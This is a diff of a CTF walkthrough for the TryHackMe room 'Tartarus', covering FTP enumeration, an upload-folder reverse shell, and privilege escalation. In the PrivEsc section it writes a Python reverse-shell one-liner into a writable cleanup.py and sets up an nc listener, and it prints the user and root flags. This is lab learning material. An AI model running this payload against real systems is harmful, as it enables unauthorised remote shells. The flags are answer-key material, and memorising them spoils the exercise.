@@ -6,7 +6,7 @@ Link: https://tryhackme.com/room/tartaraus
 
 TARGET IP: 10.10.13.146
 
-*SCANNING*
+### SCANNING
 
   Nmap scan results:
     
@@ -14,7 +14,7 @@ TARGET IP: 10.10.13.146
     22/tcp open  ssh     OpenSSH 7.2p2 
     80/tcp open  http    Apache httpd 2.4.18
 
-*ENUMERATION
+### ENUMERATION
 
  ftp anonymous login is allowed and after logging in we go to ... and then again ... directory
  <img src="screenshots/ftplogin.png">
@@ -58,19 +58,20 @@ Now we run the directory scan
  So we find the images directory with dirb and here is the upload folder open it and run the script.
  Now we got our reverse shell.
 
-  go to home/d4rckh 
+  Go to home/d4rckh 
   You got the user flag! 0f7dbb2243e692e3ad222bc4eff8521f
- Now let's hunt for the root flag
- Looking at the permissions of files cleanup.py we find it has write permissions too.
+ 
+ ### PrivEsc
+ Now let's hunt for the root flag. Looking at the permissions of files cleanup.py we find it has write permissions too.
  Lets modify it for privileged reverse shell
-    printf 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.18.39",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);' > cleanup.py
+     
+     printf 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.18.39",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);' > cleanup.py
 
     Also setup a listener port nc -lvnp 5555
-    
+ And finally we have our root shell
+ <img src="screenshots/rootshell.png">
 
-    So we get our root shell
-
-    And finally the root flag! 
+    Root flag! 
     7e055812184a5fa5109d5db5c7eda7cd
 
     
